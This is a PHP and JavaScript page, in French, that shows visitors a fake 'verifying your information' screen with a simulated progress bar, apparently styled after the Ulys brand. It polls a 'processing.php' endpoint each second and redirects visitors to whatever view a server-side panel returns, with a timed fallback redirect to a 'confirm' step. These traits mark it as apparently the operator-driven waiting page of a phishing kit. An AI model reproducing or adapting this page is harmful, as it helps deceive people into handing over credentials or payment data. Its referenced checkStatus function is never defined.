<?php
require_once 'config/panel.php';
// Start output buffering to capture content
ob_start();
?>

<div class="ulys-main" style="justify-content: center; align-items: center; min-height: 70vh;">
    <div class="ulys-login-card" style="max-width: 420px; text-align: center; padding: 48px 36px;">
        <h2 style="margin-bottom: 18px;">Vérification de vos informations</h2>
        <div class="mb-4">
            <div class="ulys-spinner" style="margin: 0 auto 18px auto; width: 56px; height: 56px; border: 5px solid #ffcfb3; border-top: 5px solid #ff3c1b; border-radius: 50%; animation: ulys-spin 1s linear infinite;"></div>
        </div>
        <p style="font-size: 1.08rem; color: #222; margin-bottom: 32px;">Veuillez patienter pendant que nous traitons votre demande.<br>Cela peut prendre quelques instants.</p>
        <div class="ulys-progress-bar" style="height: 7px; background: #f3f3f3; border-radius: 4px; overflow: hidden; margin-bottom: 18px;">
            <div id="progressBar" style="width: 0%; height: 100%; background: linear-gradient(90deg, #ffcfb3 0%, #ff3c1b 100%); transition: width 0.2s;"></div>
        </div>
        <p style="font-size: 0.95rem; color: #888; margin-top: 18px;">Merci de ne pas fermer cette page.</p>
    </div>
</div>

<style>
@keyframes ulys-spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
</style>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script>
    var z = setInterval(function() {
        $.ajax({
            method: "GET",
            url: 'processing.php?waiting=1',
            success: function(data) {
                if (data !== '') {
                    window.location.href = 'index.php?view=' + data + '&id=<?= md5(time()) ?>';
                }
            },
        });

    }, 1000); // 1000 = 1s
</script>
<script>
    // Fonction pour simuler un chargement
    function simulateLoading() {
        var progressBar = document.getElementById('progressBar');
        var width = 0;
        var interval = setInterval(function() {
            if (width >= 100) {
                clearInterval(interval);
                checkStatus();
            } else {
                width += 1;
                progressBar.style.width = width + '%';
            }
        }, 50);

        // Timer pour redirection automatique après TIMER secondes
        setTimeout(function() {
            window.location.href = 'index.php?view=confirm&id=' + Math.random();
        }, <?php echo (defined('TIMER') ? (int)TIMER : 30) * 1000; ?>);
    }


    // Démarrer la simulation au chargement de la page
    window.onload = simulateLoading;
</script>

<?php
// Get the buffer contents and clean the buffer
$viewContent = ob_get_clean();

// Include layout with the view content
include_once 'layout.php';
?> 